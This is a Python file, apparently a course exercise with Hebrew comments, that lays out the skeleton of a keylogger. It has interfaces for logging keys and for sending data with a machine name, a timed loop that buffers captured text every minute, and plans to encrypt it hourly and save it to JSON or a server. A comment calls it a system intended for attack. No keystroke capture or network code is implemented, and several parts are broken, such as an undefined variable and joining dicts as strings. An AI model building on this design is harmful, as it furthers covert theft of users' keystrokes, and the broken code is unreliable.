import time
from abc import ABC, abstractmethod
from timeit import timeit
from typing import List
class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass

#2

# iwriter.py
from abc import ABC, abstractmethod
class IWriter(ABC):
    @abstractmethod
    def send_data(self, data: str, machine_name: str) -> None:
        pass

#3
# class Encryptor:
#     pass


#4
class RunKeyLogger:
    def __init__(self):
        self.kl_str = ''
        self.kl_list = ['']
        #self.stack = [None,None,None,None]
        self.time_list = []
        self.__start_stop = True

    # מחזיר את הערך
    def start_stop_peek(self):
        # אם יש לך תנאי -- תכתוב .. ותשנה את המשתנה
        return self.__start_stop

    # במקרה של מחיקה מרובה נוכל לקחת את האינדקס אחד לפני האחרון
    def return_index(self,index):
        return self.time_list.index(index)

# לפי ההערכה שלי - זה הפונקציה שצריכה לרוץ ב - main
class KeyLoggerManager:


    def __init__(self):
        self.data = RunKeyLogger()

    def time_now(self):
        import datetime
        # שמירת שעה נוכחית
        time_now = datetime.datetime.now()
        # פורמט של שעה נפרד ותאריך נפרד
        time_now_str = f'{time_now.strftime("%H:%M:%S")} - {time_now.strftime("%d/%m/%Y")}'
        return time_now_str

    # קובץ main

    #כל 60 שניות מכניסה לפעולה
    #מערכת שתשמור את הנתונים שמוזנים

    # כל 60 דקות מכניס לפעולה מערכת
    # שתשמור את ה list בקובץ או בשרת

    # משתנה run הוא start/stop במחלקת

    #צריכים עדיין להגדיר איך הנתונים ישמרו ב - class RunKeyLogger
    def start_key_logger(self):
        num_make_hour = 0
        while True:
            time.sleep(60)
            num_make_hour += 1
            if num_make_hour > 60 or self.data.start_stop_peek() == False: #False הכוונה לפקודת סטופ הכללית במערכת
                num_make_hour = 0
                self.start_option_spesific() # עדיין לא בוצע א. להעביר להצפנה ב. להעביר לשמירה בגייסון
            self.start_option_regular()

    #כל 60 שניות - 1 דקה יעשה את :
    def start_option_regular(self):
        if self.data.kl_str != '':
            self.data.kl_list.append(self.data.kl_str)
            self.data.time_list.append(self.time_now())

    # כל 60 דקות - 1 שעה יעשה את :
    # במתודה הזו עדיין לא בוצע א. להעביר להצפנה ב. להעביר לשמירה בגייסון(שאת זה מספר 2 יעשה ורק צריך הפנייה)
    def start_option_spesific(self):
        # בעת שימוש במתודה כתוב שצריך להצפין את הנתונים
        # אך פקודה זו יוצרת כפילות בנתונים = הן בהצפנה והן בשמירת ערך המקורי
        # בתור מערכת שמיועדת להתקפה אין צורך בשמירת ערך האמיתי מלכתחילה אלא כל אות להכניס להצפנה
        # יכול להיות שעצם השתמשות בהצפנה הכל אות יצור עומס כללי בפעולות המחשב ואנחנו רוצים שזה יוצר 'בפעם אחת' כמות של אותיות - לבדוק
        pass

###############חומר הרחבה########################
    #פונקציה שמיועדת לשמירה בג'יסון רק של ה dict שמצויין בפונקציה הקודמת - חומר של השלמה
    def save_kl_listDict(self):
        import json
        machine_name = self.kl_list_WhichBecame_str
        try:
            with open('dict_of_hour.json', encoding="utf-8") as file:
                existing_data = json.load(file)
        except (FileNotFoundError, json.JSONDecodeError):
            existing_data = []
        entry = {"תאריך ושעה": data, "התוכן": machine_name}
        existing_data.append(entry)
        with open('dict_of_hour.json' , "w", encoding="utf-8") as file:
            json.dump(existing_data, file, ensure_ascii=False)  # כדי להפעיל את הפונקציה צריכים שם קובץ שמסתיים בגיסון #לדוגמא #writer = FileWriter("log.gson") #writer.send_data("12,01,2025-12:35",[1,5,9,58,2,8])


##################הפונקציה הבאה משוכפלת - אין צורך לעבור ###############
    # כל 60 דקות - 1 שעה יעשה את :
    # במתודה הזו עדיין לא בוצע א. להעביר להצפנה ב. להעביר לשמירה בגייסון(שאת זה מספר 2 יעשה ורק צריך הפנייה)
    def __start_option_spesific(self):
        #אופציה אחת לשלוח את זה לג'ייסון
        self.kl_list_WhichBecame_str = self.data.kl_list.copy() #האם באמת יוצר עותק ?
        kl_list_WhichBecame_str_func = ''.join(self.kl_list_WhichBecame_str)
        # כעת לשלוח את kl_list_str_func בתור מחרוזת str גדולה
        # הפונקצייה שמקבלת ג'ייסון - יודעת לקבל ליסט ?

        #יצירת דיקשינרי של תוכן והשעה שלו במשך השעה הזאת
        # במידה ואחפש תוכן מסוים - יהיה לי יותר קל לרוץ ככה
        self.kl_listDict_WhichBecame_list = []
        for i in range(len(self.data.kl_list)):
            self.kl_list_WhichBecame_str.append(self.data.kl_list[i])
            self.kl_listDict_WhichBecame_list.append({self.data.time_list[i] : self.data.kl_list[i]}) #מוסיף לו dict כל פעם את i
        kl_listDict = ','.join(self.kl_listDict_WhichBecame_list)
        kl_listDict = {f'{self.time_now()}': kl_listDict} # return : { 10-02-25 : {12:50:'bbnfh'} , {12:51:'fscs'} }
        self.kl_listDict_WhichBecame_list = kl_listDict
        self.save_kl_listDict()
##################################סוף שיכפול#####################

#5
#class NetworkWriter:

   #תוצאה נדרשת
#send_data(data: str, machine_name: str) -> None

#    pass

#חלק 2 בניית Backend
